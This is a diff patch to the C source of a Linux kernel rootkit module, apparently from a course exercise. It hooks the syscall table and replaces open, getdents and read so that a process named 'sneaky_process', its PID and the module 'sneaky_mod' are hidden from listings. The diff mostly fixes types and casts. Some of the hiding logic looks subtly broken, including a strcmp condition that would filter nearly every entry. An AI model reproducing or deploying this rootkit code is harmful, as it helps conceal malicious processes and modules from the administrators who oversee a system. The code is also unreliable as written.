@@ -47,7 +47,7 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 //This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage size_t (*original_read)(int fd, void *buf, size_t count);
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
@@ -66,11 +66,11 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
   char pid_buffer [10];
   snprintf(pid_buffer, 10, "%d", pid);
   while (pos < byteNum) {
-    linux_dirent *curDirp = (void *)dirp + pos;
+    struct linux_dirent *curDirp = (void *)dirp + pos;
     if (strcmp(curDirp->d_name, "sneaky_process") || strcmp(curDirp->d_name, pid_buffer)) {
-      void * end = (void *)dirp + byteNum;
-      void * curEnd = (void *)curDirp + curDirp->d_reclen;
-      size_t num = (size_t)end - curEnd;
+      void *end = (void *)dirp + byteNum;
+      void *curEnd = (void *)curDirp + curDirp->d_reclen;
+      size_t num = (size_t)(end - curEnd);
       memcpy(curDirp, (void *)curDirp + curDirp->d_reclen, num); 
       byteNum = byteNum - curDirp->d_reclen;
       continue;
@@ -82,11 +82,11 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 
 //Define our new sneaky version of the 'read' syscall
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
-  size_t num = original_read(fd, buf, count);
+  ssize_t num = original_read(fd, buf, count);
   if (num == -1) { return num; }
-  void * pos = strnstr(buf, "sneaky_mod", num);
+  void *pos = strnstr(buf, "sneaky_mod", num);
   if (pos == NULL) { return num; }
-  void * end = strnstr(pos, "\n", num - (pos - buf));
+  void *end = strnstr(pos, "\n", num - (pos - buf));
   if (end == NULL) { return num; }
   memcpy(pos, end + 1, num - (pos - buf) - (end + 1 - pos));
   num = num - (end + 1 - pos);
